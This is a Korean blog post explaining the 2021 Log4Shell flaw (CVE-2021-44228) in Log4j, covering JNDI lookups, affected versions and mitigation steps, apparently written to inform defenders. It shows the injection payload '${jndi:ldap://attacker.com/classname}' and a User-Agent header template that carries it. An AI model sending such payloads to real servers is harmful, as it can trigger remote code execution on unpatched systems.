---
title: "Log4j 보안 취약점 "
tags: [보안뉴스, log4j, log4shell]
author: eli_ez3r
key: 20211213
modify_date: 2021-12-13
article_header:
  type: cover
  image:
    src: 
---
-----

2021년 12월 10일  Log4j보안 취약점에 대한 긴급패치가 발표되었다.

이번 발견된 Log4j취약점 `Log4Shell`은 2021년 11월 24일 Alibaba Cloud 보안팀으로 부터 발견된 Zero-Day[^1] 취약점으로 뉴스에서 발표될 당시에는 이미 취약점 패치를 진행한 후 발표된 One-Day[^2] 취약점인 상태였다.

KISA : [Apache Log4j 2 보안 업데이트 권고](https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389)

CVE : [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

-----



## Log4j 란?

Log4j는 Apache Software Foundation에서 개발한 인기있는 [로깅 유틸리티 라이브러리](https://en.wikipedia.org/wiki/Log4j)로 Apache 오픈소스이다.

전 세계 수 많은 서비스들이 Log4j를 이용하고 있으며 자바 프로그래밍 초보시절 `system.out.println("debug : " + str)` 로 디버깅 하던 것 대신, `log.info("debug {}", str)`하라고 조언 받은것 처럼 널리 사용하고 있는 라이브러리이다.



## Log4j 취약점

현재 문제가 있는 log4j 라이브러리는 `log4j-core-<version>jar`이며, Log4j가 넘겨받은 변수를 그대로 로깅하는 것이 아니라 해당 변수를 분석해 할 수 있는 경우 실행하는 `Lookups` 기능에서 발견되었다.

예를들어, `log.info("Debug: {}", str)`에서 `str`이 `${env:USER}`라면 `USER`가 누군지 찾아서, `Debug: eli_ez3r`라고 문구를 완성하고 해당 문구를 출력하는 경우이다.

현재 취약점은 Lookups기능 중에서도 특히 `JDNI`라는 Lookups을 이용해 공격이 가능하다.

Apache Log4j 2의 일부 기능에는 재귀 분석 기능(Recursive Analysis Functions)이 있기 때문에 공격자가 직접 악성 요청을 구성하여 원격 코드 실행 취약점(RCE)을 유발시킬 수 있어 CVSS스코어 10점으로 가장 높은 심각도를 나타내고 있다.

취약점 악용에는 특별한 구성이 필요하지 않으며, Alibaba Cloud 보안팀의 검증결과 Apache Struts2, Apache Solr, Apache Druid, Apache Flink 등이 모두 영향을 받는 것으로 알려있다.



## JNDI를 이용한 공격

JNDI란 Java Naming and Directory Interface의 약자로 보통 분산시스템에서 다른 리소스를 가져오는데 사용할 수 있다.

다른 리소스의 예로 자바 클래스 등에서 공격자가 이 경로를 자신의 서버로 지정하면 취약점이 있는 서버가 공격자의 서버에서 클래스를 다운받는 것이다.

이렇게 공격자의 서버에서 클래스를 다운받아 코드를 실행하게 된다.



예를들어 다음과 같은 로그 라인이 서버 어플리케이션에 존재한다고 하자.

```java
log.info("Debug: {}", payload);	
```

여기서 payload는 HTTP Requests에서 요청자가 보낸 문자열이다.

이 문자열이 `${jndi:ldap://attacker.com/classname}`을 포함하면 Log4j는 이를 해석하여 `ldap://attacker.com/classname`을 실행시키게 된다.

현재 가장 쉽게 공격할 수 있는 방법은 HTTP 헤더 `User-Agent`에 ldap주소를 넣어 코드를 다운받는 방법이라고 한다.

```
User-Agent : ${jndi:ldap://<host>:<port>/<path>}
```

물론 User-Agent 헤더 뿐만 아니라, HTTP Request에게서 받은 문자열을 로깅하는 경우 어디서든지 지정한 문자열을 로깅하기만 하면 취약점에 노출되어 있다.



## Log4Shell 취약점은 사상 최약의 취약점?

Log4Shell의 취약점은 RCE취약점으로 취약점 중에서도 심각한 단계의 취약점으로 분류된다.

하지만 그 외에도 아래와 같은 점들 때문에 `사상 최약의 취약점`이라고 불려지고 있다.

1. Log4j는 자바 기반의 소프트웨어에서 굉장히 많이 쓰여지고 있는 라이브러리이다. => 공격 대상/범위가 광범위하다
2. 공격 방법이 간단하다. => 복잡한 과정없이 POC코드를 전송하기만 하면 공격이 성공한다.
3. 하나의 소프트웨어는 여러개의 소프트웨어가 조합되어 만들어지는데, 그중 한곳에서라도 Log4j를 사용하게 되면, 해당 소프트웨어는 취약하다.
4. 내 서버가 이미 공격을 당했는지 분석하기 위해서는 Log4j를 사용한 시점부터 분석해야 한다. => 10년 넘게 Log4j를 사용했다면?



## 영향 받는 버전

1. Apache Log4j 2
   - 2.0-bete9 ~ 2.14.1 모든 버전
2. Apache LOg4j 2를 사용하는 제품
   - [참고사이트](https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592)를 확인하여 해당 제품을 이용 중일 경우, 해당 제조사의 권고에 따라 패치 또는 대응 방안 적용



## 해결방법

1. JDNI 취약점이 해결된 버전으로 패치한다
2. 2.0-beta9 ~ 2.10.0
   - JndiLookup 클래스를 경로에서 제거 : zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
3. 2.10 ~ 2.14.1
   - log4j2.formatMsgNoLookups 또는 LOG4J_FORMAT_MSG_NO_LOOKUPS 환경변수를 true로 설정
4. [제조사 홈페이지](https://logging.apache.org/log4j/2.x/download.html)를 통해 최신버전(2.15.0)으로 업데이트 적용



-----

출처: [ESTsecurity](https://blog.alyac.co.kr/4341), [KISA](https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389)

-----

[^1]:취약점이 알려지지 않거나, 관련 패치가 배포되지 않은 시기
[^2]: 취약점 대응 패치가 배포된 시기
